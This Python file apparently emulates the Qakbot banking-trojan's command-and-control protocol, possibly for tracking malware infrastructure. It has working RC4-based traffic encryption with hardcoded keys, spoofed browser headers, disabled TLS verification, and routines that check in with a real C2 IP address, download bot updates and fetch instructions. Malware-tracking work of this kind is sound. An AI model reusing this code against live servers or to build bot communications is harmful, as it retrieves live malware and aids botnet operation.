import base64
import hashlib
import json
import random
import string
import time

import requests
from arc4 import ARC4
from urllib3 import disable_warnings

disable_warnings()


class Qakbot:
    def __init__(self, campaign_id, file_id, bot_version,
                 seed=b'\xF6\x6E\xDA\xAE\x7F\xE8\xDC\x6B\xFC\x96\x5F\xDF\xC7\xCF\x23\x27',
                 salt=b'jHxastDcds)oMc=jvh7wdUhxcsdt2'):
        self.seed = seed
        self.salt = salt
        self.campaign_id = campaign_id
        self.file_id = file_id
        self.bot_version = bot_version
        self.init_ts = int(time.time())

    @staticmethod
    def random_string(length=8, digits=False):
        """
        Generate random string

        :return:
        """
        if digits:
            return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    def encrypt(self, data):
        """
        Qakbot network data encryption

        :param data:
        :return:
        """
        return base64.b64encode(self.seed + ARC4(hashlib.sha1(self.seed + self.salt).digest()).encrypt(data)).decode()

    def decrypt(self, data):
        """
        Qakbot network data decryption

        :param data:
        :return:
        """
        data = base64.b64decode(data)
        return ARC4(hashlib.sha1(data[0:16] + self.salt).digest()).decrypt(data[16:]).decode()

    def query(self, c2c, port, data):
        """

        :param c2c:
        :param port:
        :param data:
        :return:
        """
        headers = {
            'Accept': 'application/x-shockwave-flash, image/gif, image/jpeg, image/pjpeg, */*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Content-Length': str(len(data)),
            'Cache-Control': 'no-cache'
        }

        try:
            r = requests.post(f'https://{c2c}:{port}/t3', data='{}={}'.format(self.random_string(), self.encrypt(data)),
                              headers=headers, verify=False, timeout=10)
            r.raise_for_status()

            if r.content:
                return json.loads(self.decrypt(r.content))
            return True
        except:
            pass

    def check_status(self, c2c, port):
        """
        Check if a C2 server is online

        :param c2c:
        :param port:
        :return:
        """
        return True if self.query(c2c, port, '{{"8":2,"1":17,"2":"{}","3":"{}","18":1,"40":0}}'.
                                  format(self.file_id, self.campaign_id)) else False

    def get_updates(self, c2c, port):
        """
        Download updates from server

        :param c2c:
        :param port:
        :return:
        """
        now_ts = int(time.time())
        cmd = '{{"8":1,"1":17,"2":"{}","3":"{}","4":804,"5":142,"10":"{}","6":{},"7":{},"59":0,' \
              '"14":"{}"}}'
        return self.query(c2c, port, cmd.format(
            self.file_id, self.campaign_id, self.bot_version, now_ts % self.init_ts,
            now_ts - int(self.init_ts / 10000) * 10000,
            self.random_string(random.choice(range(30, 40)), True)
        ))['20']

    def get_instruction(self, c2c, port):
        """
        Fetch instructions from C2C

        :return:
        """
        return self.query(c2c, port, '{{"8":9,"1":17,"2":"{}"}}'.format(self.file_id))


if __name__ == '__main__':
    bot = Qakbot('spx143', 'cjitrk837888', '1592631929')
    a = bot.get_updates('80.240.26.178', '443')
    b = bot.check_status('80.240.26.178', '443')
    c = bot.get_instruction('80.240.26.178', '443')
    pass
